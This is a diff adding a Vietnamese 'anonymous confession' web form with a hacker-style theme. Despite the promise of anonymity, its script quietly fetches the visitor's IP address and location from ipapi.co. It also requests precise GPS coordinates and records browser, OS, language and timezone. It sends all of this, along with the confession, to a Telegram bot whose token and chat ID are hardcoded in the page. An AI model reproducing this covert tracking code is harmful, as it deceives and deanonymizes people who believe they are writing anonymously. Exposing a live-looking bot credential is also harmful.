@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Confession Ẩn Danh - Hacker Style</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    /* Reset & base */
+    * {
+      box-sizing: border-box;
+      margin: 0; padding: 0;
+      font-family: 'Share Tech Mono', monospace;
+      color: #00ff99;
+      background: #000;
+    }
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      background: linear-gradient(135deg, #000000 0%, #004d00 100%);
+      overflow-x: hidden;
+    }
+    main {
+      background: rgba(0, 0, 0, 0.85);
+      padding: 30px;
+      border-radius: 12px;
+      max-width: 450px;
+      width: 100%;
+      box-shadow: 0 0 15px #00ff99;
+    }
+    h1 {
+      font-size: 2.5rem;
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px #00ff99;
+      user-select: none;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+    label {
+      font-size: 0.9rem;
+      margin-bottom: 5px;
+      color: #00cc77;
+    }
+    input, textarea {
+      background: #001100;
+      border: 2px solid #004400;
+      border-radius: 6px;
+      color: #00ff99;
+      font-family: monospace;
+      font-size: 1rem;
+      padding: 10px;
+      outline-offset: 2px;
+      outline-color: #00ff99;
+      transition: border-color 0.3s ease;
+    }
+    input:focus, textarea:focus {
+      border-color: #00ff99;
+    }
+    textarea {
+      resize: vertical;
+      min-height: 100px;
+    }
+    button {
+      background: #00ff99;
+      color: #000;
+      font-weight: 700;
+      font-size: 1.1rem;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 0 12px #00ff99;
+      transition: background-color 0.3s ease;
+      user-select: none;
+    }
+    button:hover {
+      background: #00cc77;
+      box-shadow: 0 0 18px #00cc77;
+    }
+    #statusMsg {
+      margin-top: 15px;
+      text-align: center;
+      font-weight: 700;
+      color: #00ff99;
+      text-shadow: 0 0 10px #00ff99;
+      min-height: 24px;
+      user-select: none;
+    }
+    /* reCAPTCHA container */
+    .g-recaptcha {
+      margin: 15px 0;
+      user-select: none;
+    }
+  </style>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+  <main>
+    <h1>💬 Confession Ẩn Danh - Hacker Style</h1>
+    <form id="confessionForm" autocomplete="off">
+      <label for="message">Nội dung confession <span style="color:#ff4444">*</span></label>
+      <textarea id="message" name="message" placeholder="Viết gì đó đi..." required></textarea>
+
+      <label for="nickname">Nickname (tùy chọn)</label>
+      <input id="nickname" name="nickname" placeholder="Tên hoặc bí danh" type="text" maxlength="30" />
+
+      <label for="facebook">Link Facebook (tùy chọn)</label>
+      <input id="facebook" name="facebook" placeholder="https://facebook.com/abc" type="url" />
+
+      <label for="phone">Số điện thoại (tùy chọn)</label>
+      <input id="phone" name="phone" placeholder="0123456789" type="tel" pattern="[0-9]{6,15}" />
+
+      <!-- Google reCAPTCHA v2 -->
+      <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div>
+
+      <button type="submit">Gửi Confession</button>
+    </form>
+    <div id="statusMsg"></div>
+  </main>
+
+  <script>
+    const token = "7315329822:AAEfzCe8NSQM6yvWH0zwzJxsvKYMvHxYhHU";
+    const chatId = "5674777894";
+
+    async function getGeolocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+          },
+          () => resolve(null),
+          { timeout: 7000 }
+        );
+      });
+    }
+
+    function getBrowserInfo() {
+      const ua = navigator.userAgent;
+      const parser = (() => {
+        let tem, M = ua.match(/(opera|chrome|safari|firefox|edge|trident(?=\/))\/?\s*(\d+)/i) || [];
+        if (/trident/i.test(M[1])) {
+          tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
+          return { name: 'IE', version: tem[1] || '' };
+        }
+        if (M[1] === 'Chrome') {
+          tem = ua.match(/\b(OPR|Edg)\/(\d+)/);
+          if (tem != null) {
+            return { name: tem[1].replace('OPR', 'Opera').replace('Edg', 'Edge'), version: tem[2] };
+          }
+        }
+        M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
+        return { name: M[0], version: M[1] };
+      })();
+      return parser;
+    }
+
+    document.getElementById('confessionForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const recaptchaResponse = grecaptcha.getResponse();
+      if (!recaptchaResponse) {
+        document.getElementById('statusMsg').textContent = "❌ Vui lòng xác thực CAPTCHA trước khi gửi!";
+        return;
+      }
+
+      document.getElementById('statusMsg').textContent = "⏳ Đang xử lý...";
+
+      const message = e.target.message.value.trim();
+      if (!message) {
+        document.getElementById('statusMsg').textContent = "❌ Nội dung không được để trống!";
+        return;
+      }
+      const nickname = e.target.nickname.value.trim() || "Ẩn danh";
+      const facebook = e.target.facebook.value.trim() || "Không cung cấp";
+      const phone = e.target.phone.value.trim() || "Không cung cấp";
+
+      const browser = getBrowserInfo();
+      const os = navigator.platform;
+      const language = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const now = new Date().toLocaleString();
+
+      // Lấy IP & vị trí IP từ ipapi.co
+      let ipData = { ip: "Không lấy được IP", city: "Unknown", region: "Unknown", country: "Unknown" };
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        if (res.ok) {
+          ipData = await res.json();
+        }
+      } catch {}
+
+      // Lấy location nếu user đồng ý
+      const geo = await getGeolocation();
+
+      // Gửi data
+      const text = `
+📩 Confession mới:
+
+📝 Nội dung: ${message}
+👤 Nickname: ${nickname}
+🔗 Facebook: ${facebook}
+📞 SĐT: ${phone}
+
+🌐 IP: ${ipData.ip}
+📍 Vị trí IP: ${ipData.city}, ${ipData.region}, ${ipData.country_name}
+📌 Location chính xác: ${geo ? `Lat ${geo.lat.toFixed(5)}, Lon ${geo.lon.toFixed(5)}` : "Không cấp quyền"}
+
+🧑‍💻 Trình duyệt: ${browser.name} v${browser.version}
+💻 Hệ điều hành: ${os}
+🌐 Ngôn ngữ: ${language}
+⏰ Múi giờ: ${timezone}
+🕒 Thời gian gửi: ${now}
+      `;
+
+      // Gửi Telegram
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text }),
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          document.getElementById('statusMsg').textContent = "✅ Gửi thành công! Cảm ơn bạn 💖";
+          e.target.reset();
+          grecaptcha.reset();
+        } else {
+          document.getElementById('statusMsg').textContent = "❌ Gửi thất bại, thử lại sau!";
+        }
+      })
+      .catch(() => {
+        document.getElementById('statusMsg').textContent = "⚠️ Lỗi kết nối Telegram!";
+      });
+    });
+  </script>
+</body>
+</html>
